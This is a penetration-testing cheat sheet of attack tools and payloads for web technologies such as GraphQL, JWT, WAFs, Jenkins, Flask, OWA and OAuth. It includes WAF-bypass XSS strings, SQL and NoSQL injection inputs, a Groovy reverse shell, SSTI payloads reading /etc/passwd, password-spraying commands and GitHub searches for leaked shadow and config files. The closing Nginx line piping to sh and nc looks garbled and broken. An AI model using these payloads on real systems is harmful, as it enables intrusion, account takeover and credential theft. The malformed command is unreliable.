# Web Services

## **GraphQL**

```text
**Tools** 
https://github.com/doyensec/inql
https://github.com/swisskyrepo/GraphQLmap

Past schema here: https://apis.guru/graphql-voyager/

To test a server for GraphQL introspection misconfiguration: 
1) Intercept the HTTP request being sent to the server 
2) Replace its post content / query with a generic introspection query to fetch the entire backend schema 
3) Visualize the schema to gather juicy API calls. 
4) Craft any potential GraphQL call you might find interesting and HACK away!

example.com/graphql?query={__schema%20{%0atypes%20{%0aname%0akind%0adescription%0afields%20{%0aname%0a}%0a}%0a}%0a}
```

## **JS**

```text
# LinkFinder
# https://github.com/GerbenJavado/LinkFinder
python linkfinder.py -i https://example.com -d
python linkfinder.py -i burpfile -b

# JSScanner
# https://github.com/dark-warlord14/JSScanner
# https://securityjunky.com/scanning-js-files-for-endpoint-and-secrets/
bash install.sh
# Configure domain in alive.txt
bash script.sh
cat js/*
cd db && grep -oriahE "https?://[^\"\\'> ]+"
```

## **.NET**

```text
**Tools** 
https://github.com/icsharpcode/ILSpy
https://github.com/0xd4d/dnSpy
```

## **JWT**

```text
**Tools** 
https://github.com/ticarpi/jwt_tool
https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology
https://jwt.io/

1. Leak Sensitive Info
2. Send without signature
3. Change algorythm r to h
4. Crack the secret h256
5. KID manipulation

eyJhbGciOiJIUzUxMiJ9.eyJleHAiOjE1ODQ2NTk0MDAsInVzZXJuYW1lIjoidGVtcHVzZXI2OSIsInJvbGVzIjpbIlJPTEVfRVhURVJOQUxfVVNFUiJdLCJhcHBDb2RlIjoiQU5UQVJJX0FQSSIsImlhdCI6MTU4NDU3MzAwMH0.AOHXCcMFqYFeDSYCEjeugT26RaZLzPldqNAQSlPNpKc2JvdTG9dr2ini4Z42dd5xTBab-PYBvlXIJetWXOX80A

https://trustfoundry.net/jwt-hacking-101/
https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9
https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/
https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a

- Crack
pip install PyJWT
https://github.com/Sjord/jwtcrack
https://raw.githubusercontent.com/Sjord/jwtcrack/master/jwt2john.py
jwt2john.py JWT
./john /tmp/token.txt --wordlist=wordlist.txt

- Wordlist generator crack tokens:
https://github.com/dariusztytko/token-reverser
```

## **Github**

```text
**Tools**

# GitDumper 
  https://github.com/internetwache/GitTools
  If we have access to .git folder: 
  ./gitdumper.sh http://example.com/.git/ /home/user/dump/ 
  git cat-file --batch-check --batch-all-objects | grep blob git cat-file -p HASH
# GitGot 
  https://github.com/BishopFox/GitGot
  ./gitgot.py --gist -q CompanyName./gitgot.py -q '"example.com"'./gitgot.py -q "org:github cats"
# GitRob https://github.com/michenriksen/gitrob
  gitrob website.com
# GitHound https://github.com/tillson/git-hound 
  echo "domain.com" | githound --dig --many-results --languages common-languages.txt --threads 100
* GitGrabber https://github.com/hisxo/gitGraber
* SSH GIT https://shhgit.darkport.co.uk/
# GithubSearch
  https://github.com/gwen001/github-search
# Trufflehog
trufflehog https://github.com/company/repo

* GitMiner [https://github.com/UnkL4b/GitMiner](https://github.com/UnkL4b/GitMiner)
* wordpress configuration files with passwords
  python3 gitminer-v2.0.py -q 'filename:wp-config extension:php FTP\_HOST in:file ' -m wordpress -c pAAAhPOma9jEsXyLWZ-16RTTsGI8wDawbNs4 -o result.txt
* brasilian government files containing passwords
  python3 gitminer-v2.0.py --query 'extension:php "root" in:file AND "gov.br" in:file' -m senhas -c pAAAhPOma9jEsXyLWZ-16RTTsGI8wDawbNs4
* shadow files on the etc paste
  python3 gitminer-v2.0.py --query 'filename:shadow path:etc' -m root -c pAAAhPOma9jEsXyLWZ-16RTTsGI8wDawbNs4
* joomla configuration files with passwords 
  python3 gitminer-v2.0.py --query 'filename:configuration extension:php "public password" in:file' -m joomla -c pAAAhPOma9jEsXyLWZ-16RTTsGI8wDawbNs4
  
  
sudo docker pull zricethezav/gitleaks
sudo docker run --rm --name=gitleaks zricethezav/gitleaks -v -r https://github.com/zricethezav/gitleaks.git

Then visualize a commit:
https://github.com/[git account]/[repo name]/commit/[commit ID]
https://github.com/zricethezav/gitleaks/commit/744ff2f876813fbd34731e6e0d600e1a26e858cf

# Manual local checks inside repository
git log
# Checkout repo with .env file
git checkout f17a07721ab9acec96aef0b1794ee466e516e37a
ls -la
cat .env
```

## **GitLab**

```text
If you find GitLab login panel, try to go to:
/explore
Then use the searchbar for users,passwords,keys...
```

## **WAFs**

```text
**Tools**

whatwaf https://example.com
wafw00f https://example.com
# bypass-firewalls-by-DNS-history
# https://github.com/vincentcox/bypass-firewalls-by-DNS-history
  bash bypass-firewalls-by-DNS-history.sh -d example.com

# Good bypass payload:
%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)
javascript:”/*’/*`/* →<html \” onmouseover=/*&lt;svg/*/onload=alert()//>

# Bypass trying to access to :
dev.domain.com
stage.domain.com
ww1/ww2/ww3...domain.com
www.domain.uk/jp/

# Akamai
origin.sub.domain.com
origin-sub.domain.com
- Send header:
Pragma: akamai-x-get-true-cache-key
{{constructor.constructor(alert`1`)()}}

# Cloudflare
python3 cloudflair.py domain.com
# https://github.com/mandatoryprogrammer/cloudflare_enum
cloudflare_enum.py disney.com
https://viewdns.info/iphistory/?domain=domain.com
https://whoisrequest.com/history/

# Cloudflare bypasses
<!<script>alert(1)</script>
<a href=”j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this[‘document’][‘cookie’]&rpar;”>X</a>
<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert'1';>
<select><noembed></select><script x='a@b'a>y='a@b'//a@b%0a\u0061lert(1)</script x>
<a+HREF=’%26%237javascrip%26%239t:alert%26lpar;document.domain)’>

# DNS History
https://whoisrequest.com/history/

# Imperva 
https://medium.com/@0xpegg/imperva-waf-bypass-96360189c3c5
url.com/search?search=%3E%3C/span%3E%3Cp%20onmouseover=%27p%3D%7E%5B%5D%3Bp%3D%7B%5F%5F%5F%3A%2B%2Bp%2C%24%24%24%24%3A%28%21%5B%5D%2B%22%22%29%5Bp%5D%2C%5F%5F%24%3A%2B%2Bp%2C%24%5F%24%5F%3A%28%21%5B%5D%2B%22%22%29%5Bp%5D%2C%5F%24%5F%3A%2B%2Bp%2C%24%5F%24%24%3A%28%7B%7D%2B%22%22%29%5Bp%5D%2C%24%24%5F%24%3A%28p%5Bp%5D%2B%22%22%29%5Bp%5D%2C%5F%24%24%3A%2B%2Bp%2C%24%24%24%5F%3A%28%21%22%22%2B%22%22%29%5Bp%5D%2C%24%5F%5F%3A%2B%2Bp%2C%24%5F%24%3A%2B%2Bp%2C%24%24%5F%5F%3A%28%7B%7D%2B%22%22%29%5Bp%5D%2C%24%24%5F%3A%2B%2Bp%2C%24%24%24%3A%2B%2Bp%2C%24%5F%5F%5F%3A%2B%2Bp%2C%24%5F%5F%24%3A%2B%2Bp%7D%3Bp%2E%24%5F%3D%28p%2E%24%5F%3Dp%2B%22%22%29%5Bp%2E%24%5F%24%5D%2B%28p%2E%5F%24%3Dp%2E%24%5F%5Bp%2E%5F%5F%24%5D%29%2B%28p%2E%24%24%3D%28p%2E%24%2B%22%22%29%5Bp%2E%5F%5F%24%5D%29%2B%28%28%21p%29%2B%22%22%29%5Bp%2E%5F%24%24%5D%2B%28p%2E%5F%5F%3Dp%2E%24%5F%5Bp%2E%24%24%5F%5D%29%2B%28p%2E%24%3D%28%21%22%22%2B%22%22%29%5Bp%2E%5F%5F%24%5D%29%2B%28p%2E%5F%3D%28%21%22%22%2B%22%22%29%5Bp%2E%5F%24%5F%5D%29%2Bp%2E%24%5F%5Bp%2E%24%5F%24%5D%2Bp%2E%5F%5F%2Bp%2E%5F%24%2Bp%2E%24%3Bp%2E%24%24%3Dp%2E%24%2B%28%21%22%22%2B%22%22%29%5Bp%2E%5F%24%24%5D%2Bp%2E%5F%5F%2Bp%2E%5F%2Bp%2E%24%2Bp%2E%24%24%3Bp%2E%24%3D%28p%2E%5F%5F%5F%29%5Bp%2E%24%5F%5D%5Bp%2E%24%5F%5D%3Bp%2E%24%28p%2E%24%28p%2E%24%24%2B%22%5C%22%22%2Bp%2E%24%5F%24%5F%2B%28%21%5B%5D%2B%22%22%29%5Bp%2E%5F%24%5F%5D%2Bp%2E%24%24%24%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%24%5F%2Bp%2E%5F%24%5F%2Bp%2E%5F%5F%2B%22%28%5C%5C%5C%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%5F%5F%24%2Bp%2E%5F%5F%5F%2Bp%2E%24%24%24%5F%2B%28%21%5B%5D%2B%22%22%29%5Bp%2E%5F%24%5F%5D%2B%28%21%5B%5D%2B%22%22%29%5Bp%2E%5F%24%5F%5D%2Bp%2E%5F%24%2B%22%2C%5C%5C%22%2Bp%2E%24%5F%5F%2Bp%2E%5F%5F%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%5F%5F%24%2Bp%2E%5F%24%5F%2Bp%2E%24%5F%24%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%24%5F%2Bp%2E%24%24%5F%2Bp%2E%24%5F%24%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%5F%24%5F%2Bp%2E%5F%24%24%2Bp%2E%24%24%5F%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%24%5F%2Bp%2E%5F%24%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%5F%24%2Bp%2E%5F%5F%24%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%24%5F%2Bp%2E%5F%5F%5F%2Bp%2E%5F%5F%2B%22%5C%5C%5C%22%5C%5C%22%2Bp%2E%24%5F%5F%2Bp%2E%5F%5F%5F%2B%22%29%22%2B%22%5C%22%22%29%28%29%29%28%29%3B%27%3E

# FAIL2BAN SQLi
(SELECT 6037 FROM(SELECT COUNT(*),CONCAT(0x7176706b71,(SELECT (ELT(6037=6037,1))),0x717a717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
```

## **Firebird**

```text
**Tools** 
https://github.com/InfosecMatter/Scripts/blob/master/firebird-bruteforce.sh 
./firebird\_bruteforce.sh IP DB /PATH/pwdlist.txt

https://www.infosecmatter.com/firebird-database-exploitation/
apt-get -y install firebird3.0-utils
isql-fb
```

## **Wordpress**

```text
wpscan --url https://url.com
wpscan --url <domain> --enumerate ap at # All Plugins, All Themes
wpscan --url <domain> --enumerate u # Usernames
wpscan --url <domain> --enumerate v
vulnx -u https://example.com/ --cms --dns -d -w -e
python3 cmsmap.py https://www.example.com -F

Check IP behing WAF:
https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip/

# SQLi in WP and can't crack users hash:
1. Request password reset.
2. Go to site.com/wp-login.php?action=rp&key={ACTIVATION_KEY}&login={USERNAME}

# XMLRPC

pingback.xml:
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
 <param>
  <value>
   <string>http://10.0.0.1/hello/world</string>
  </value>
 </param>
 <param>
  <value>
   <string>https://10.0.0.1/hello/world/</string>
  </value>
 </param>
</params>
</methodCall>

curl -X POST -d @pingback.xml https://exmaple.com/xmlrpc.php

Evidence xmlrpc:
curl -d '<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>demo.sayHello</methodName><params/></methodCall>' -k https://example.com/xmlrpc.php

Enum User:
for i in {1..50}; do curl -s -L -i https://example.com/wordpress?author=$i | grep -E -o "Location:.*" | awk -F/ '{print $NF}'; done
```

## **Webdav**

```text
davtest -cleanup -url http://target
cadaver http://target
```

## **Joomla**

```text
# Joomscan
joomscan -u  http://10.11.1.111 
joomscan -u  http://10.11.1.111 --enumerate-components

python3 cmseek.py -u domain.com
vulnx -u https://example.com/ --cms --dns -d -w -e
python3 cmsmap.py https://www.example.com -F
```

## **Jenkins**

```text
JENKINSIP/PROJECT//securityRealm/user/admin

JENKINSIP/jenkins/script

Groovy RCE
def process = "cmd /c whoami".execute();println "${process.text}";

Groovy RevShell

String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## **IIS**

```text
# ViewState:
https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC

# WebResource.axd:
https://github.com/inquisb/miscellaneous/blob/master/ms10-070_check.py

# ShortNames
https://github.com/irsdl/IIS-ShortName-Scanner
java -jar iis_shortname_scanner.jar 2 20 http://domain.es

# Padding Oracle Attack:
# https://github.com/KishanBagaria/padding-oracle-attacker
npm install --global padding-oracle-attacker
padding-oracle-attacker decrypt  hex:   [options]
padding-oracle-attacker decrypt  b64:   [options]
padding-oracle-attacker encrypt              [options]
padding-oracle-attacker encrypt  hex:    [options]
padding-oracle-attacker analyze  [] [options]

# Look for web.config or web.xml
https://x.x.x.x/.//WEB-INF/web.xml

# ASP - force error paths
/con/
/aux/
con.aspx
aux.aspx
```

## **Firebase**

```text
# https://github.com/Turr0n/firebase
python3 firebase.py -p 4 --dnsdumpster -l file

# https://github.com/MuhammadKhizerJaved/Insecure-Firebase-Exploit
```

## **OWA**

```text
**Tools**

* MailSniper - [https://github.com/dafthack/MailSniper](https://github.com/dafthack/MailSniper)
* UserName Recon/Password Spraying - [http://www.blackhillsinfosec.com/?p=4694](http://www.blackhillsinfosec.com/?p=4694)
* Password Spraying MFA/2FA - [http://www.blackhillsinfosec.com/?p=5089](http://www.blackhillsinfosec.com/?p=5089)
* Password Spraying/GlobalAddressList - [http://www.blackhillsinfosec.com/?p=5330](http://www.blackhillsinfosec.com/?p=5330)
* Outlook 2FA Bypass - [http://www.blackhillsinfosec.com/?p=5396](http://www.blackhillsinfosec.com/?p=5396)
* Malicious Outlook Rules - [https://silentbreaksecurity.com/malicious-outlook-rules/](https://silentbreaksecurity.com/malicious-outlook-rules/)
* Outlook Rules in Action - [http://www.blackhillsinfosec.com/?p=5465](http://www.blackhillsinfosec.com/?p=5465)
* Spraying toolkit: [https://github.com/byt3bl33d3r/SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit)

Name Conventions:
- FirstnameLastinitial
- FirstnameLastname
- Lastname.firstname

# Password spraying:
Invoke-PasswordSprayOWA -ExchHostName mail.r-1x.com -UserList C:\users.txt -Password Dakota2019! -OutFile C:\creds.txt -Threads 10
python3 atomizer.py owa mail.r-1x.com 'Dakota2019!' ../users.txt
```

## **VHosts**

```text
**Tools** 
https://github.com/codingo/VHostScan
https://github.com/jobertabma/virtual-host-discovery
```

## **OAuth**

### Explanation

```text
OAuth 2.0
https://oauth.net/2/
https://oauth.net/2/grant-types/authorization-code/

Flow:

1. MyWeb tried integrate with Twitter.
2. MyWeb request to Twitter if you authorize.
3. Prompt with a consent.
4. Once accepted Twitter send request redirect_uri with code and state.
5. MyWeb take code and it's own client_id and client_secret and ask server for access_token.
6. MyWeb call Twitter API with access_token.

Definitions:

- resource owner: The resource owner is the user/entity granting access to their protected resource, such as their Twitter account Tweets
- resource server: The resource server is the server handling authenticated requests after the application has obtained an access token on behalf of the resource owner . In the above example, this would be https://twitter.com
- client application: The client application is the application requesting authorization from the resource owner. In this example, this would be https://yourtweetreader.com.
authorization server: The authorization server is the server issuing access tokens to the client application after successfully authenticating the resource owner and obtaining authorization. In the above example, this would be https://twitter.com
- client_id: The client_id is the identifier for the application. This is a public, non-secret unique identifier.
- client_secret: The client_secret is a secret known only to the application and the authorization server. This is used to generate access_tokens
- response_type: The response_type is a value to detail which type of token is being requested, such as code
- scope: The scope is the requested level of access the client application is requesting from the resource owner
- redirect_uri: The redirect_uri  is the URL the user is redirected to after the authorization is  complete. This usually must match the redirect URL that you have  previously registered with the service
- state: The state  parameter can persist data between the user being directed to the  authorization server and back again. It’s important that this is a  unique value as it serves as a CSRF protection mechanism if it contains a  unique or random value per request
- grant_type: The grant_type parameter explains what the grant type is, and which token is going to be returned
- code: This code is the authorization code received from the authorization server which will be in the query string parameter “code” in this request. This code is used in conjunction with the client_id and client_secret by the client application to fetch an access_token
- access_token: The access_token is the token that the client application uses to make API requests on behalf of a resource owner
- refresh_token: The refresh_token allows an application to obtain a new access_token without prompting the user
```

### Bugs

```text
- Weak redirect_uri configuration
• Open redirects: https://yourtweetreader.com/callback?redirectUrl=https://evil.com
• Path traversal: https://yourtweetreader.com/callback/../redirect?url=https://evil.com
• Weak redirect_uri regexes: https://yourtweetreader.com.evil.com
• HTML Injection and stealing tokens via referer header: https://yourtweetreader.com/callback/home/attackerimg.jpg

- Improper handling of state parameter

• Slack integrations allowing an attacker to add their Slack account as the recipient of all notifications/messages
• Stripe integrations allowing an attacker to overwrite payment info and accept payments from the victim’s customers
• PayPal integrations allowing an attacker to add their PayPal account to the victim’s account, which would deposit money to the attacker’s PayPal

- Assignment of accounts based on email address

• If not email verification is needed in account creation, register before the victim.
• If not email verification in Oauth signing, register other app before the victim.

- Disclosure of secrets in url

- Access token passed in request body
   → If the access token is passed in the request body at the time of allocating the access token to the web application there arises an attack scenario. An attacker can create a web application and register for an Oauth framework with a provider such as twitter or facebook. The attacker uses it as a malicious app for gaining access tokens. For example, a Hacker can build his own facebook app and get victim’s facebook access token and use that access token to login into victim account.

- Reusability of an Oauth access token
   → Sometimes there are cases where an Ouath token previously used does not expire with an immediate effect post logout of the account. In such cases there is a possiblility to login with the previous Oauth token i.e; replace the new Oauth access token with the old one and continue to the application. This should not be the case and is considered as a very bad practice.
```

### Multiple OAUTH resources

```text
https://owasp.org/www-pdf-archive/20151215-Top_X_OAuth_2_Hacks-asanso.pdf
https://medium.com/@lokeshdlk77/stealing-facebook-mailchimp-application-oauth-2-0-access-token-3af51f89f5b0
https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1
https://gauravnarwani.com/misconfigured-oauth-to-account-takeover/
https://medium.com/@Jacksonkv22/oauth-misconfiguration-lead-to-complete-account-takeover-c8e4e89a96a
https://medium.com/@logicbomb_1/bugbounty-user-account-takeover-i-just-need-your-email-id-to-login-into-your-shopping-portal-7fd4fdd6dd56
https://medium.com/@protector47/full-account-takeover-via-referrer-header-oauth-token-steal-open-redirect-vulnerability-chaining-324a14a1567
https://hackerone.com/reports/49759
https://hackerone.com/reports/131202
https://hackerone.com/reports/6017
https://hackerone.com/reports/7900
https://hackerone.com/reports/244958
https://hackerone.com/reports/405100
https://ysamm.com/?p=379
https://www.amolbaikar.com/facebook-oauth-framework-vulnerability/
https://medium.com/@godofdarkness.msf/mail-ru-ext-b-scope-account-takeover-1500-abdb1560e5f9
https://medium.com/@tristanfarkas/finding-a-security-bug-in-discord-and-what-it-taught-me-516cda561295
https://medium.com/@0xgaurang/case-study-oauth-misconfiguration-leads-to-account-takeover-d3621fe8308b
https://medium.com/@rootxharsh_90844/abusing-feature-to-steal-your-tokens-f15f78cebf74
http://blog.intothesymmetry.com/2014/02/oauth-2-attacks-and-bug-bounties.html
http://blog.intothesymmetry.com/2015/04/open-redirect-in-rfc6749-aka-oauth-20.html
https://www.veracode.com/blog/research/spring-social-core-vulnerability-disclosure
https://medium.com/@apkash8/oauth-and-security-7fddce2e1dc5
```

## **Flask**

```text
**Tools**
https://github.com/Paradoxis/Flask-Unsign

pip3 install flask-unsign
flask-unsign
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
flask-unsign --decode --server 'https://www.example.com/login'
flask-unsign --unsign --cookie < cookie.txt
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'

Python Flask SSTI Payloads and tricks

* {{url_for.globals}}
* {{request.environ}}
* {{config}}
* {{url_for.__globals__.__builtins__.open('/etc/passwd').read()}}
* {{self}}
* request|attr('class') == request.class == request[\x5f\x5fclass\x5f\x5f]                                                                                                       
```

## **Symfony/Twig**

* Twig: 

[https://medium.com/server-side-template-injection/server-side-template-injection-faf88d0c7f34](https://medium.com/server-side-template-injection/server-side-template-injection-faf88d0c7f34)

* Check for `www.example.com/_profiler/` it contains errors and server variables

```text
**Tools**
# Server-Side Template Injection and Code Injection Detection and Exploitation Tool 
https://github.com/epinna/tplmap
./tplmap.py -u 'http://www.target.com/page?name=John'
```

## **Drupal**

```text
**Tools** 
# https://github.com/ajinabraham/CMSScan
docker run -it -p 7070:7070 cmsscan
python3 cmsmap.py https://www.example.com -F

# https://github.com/Tuhinshubhra/CMSeeK
python3 cmseek.py -u domain.com
```

## **NoSql/MongoDB**

```text
**Tools** 
https://github.com/codingo/NoSQLMap
python setup.py install

# Payload: 
' || 'a'=='a

mongodbserver:port/status?text=1

# in URL
username[$ne]=toto&password[$ne]=toto

##in JSON
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt":""}, "password": {"$gt":""}}
```

## **PHP**

```text
**Tools** 
https://github.com/TarlogicSecurity/Chankro

# Bypass disable_functions and open_basedir
python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/html
```

## **RoR \(Ruby on Rails\)**

```text
**Tools** 
# https://github.com/presidentbeef/brakeman
gem install brakeman
brakeman /path/to/rails/application
```

## **JBoss - Java Deserialization**

```text
# JexBoss
# https://github.com/joaomatosf/jexboss
python jexboss.py -host http://target_host:8080
```

## **OneLogin - SAML Login**

```text
# https://developers.onelogin.com/saml
# https://github.com/fadyosman/SAMLExtractor
./samle.py -u https://carbon-prototype.uberinternal.com/
./samle.py -r "https://domain.onelogin.com/trust/saml2/http-post/sso/571434?SAMLRequest=nVNNb9swDP0rhu7%2BkO0iqRAH8FIMC9BtRuLtOjAS2wqwJU%2Bi1%2FTfT3aSIoc1h10siXzie3yiVx76bhD1SC9mh79H9BQd%2B854MScqNjojLHjthYEevSAp9vXXR5EnmRicJSttx6LmvPukjdLm%2Bfa1wwnkxZe2beLm%2B75l0U90XltTsQBg0db7EbfGExgKoYwvY85jXrZZJgouijxAHiqGPC8XRblEDF9eZvcqX4DEXC3v70CpgkW19%2BgoFN5Y48ce3R7dHy3xx%2B6xYi9EgxdpKsEdrInnbuhtwGQ8oNOG0BnoEml7UZZFarWC4FI6%2BfJLnsqx9Wo6ilmvuzLutgFwUcXWFw0wDIk12NlnbSbKmSbtkUABQXq34GVRrtIrthP1IL6F8tuHxnZavkV119nXjUMgrBi5EVn02boe6GNBPOFzRKv4aYYK7EF3tVIOvWfphec8HajmWQl%2BEh4p2th%2BAKf99HR4BEkXS65Rmy50vMOn%2FzHoJkwKOZUO4SYsr9apaRBRBpWtA%2BMH6%2Bhs2r%2F0rE%2B5D3p7z17%2FHOu%2F&RelayState=%2F"
```

## Adobe Flash SWF

```text
# SWF Param Finder
https://github.com/m4ll0k/SWFPFinder
bash swfpfinder.sh https://example.com/test.swf
```

## Nginx

```text
curl -gsS https://example.com:443/../../../%00/nginx-handler?/usr/lib/nginx/modules/ngx_stream_module.so:127.0.0.1:80:/bin/sh%00example.com/../../../%00/n …\<'protocol:TCP' -O 0x0238f06a#PLToffset |sh; nc /dev/tcp/localhost
```

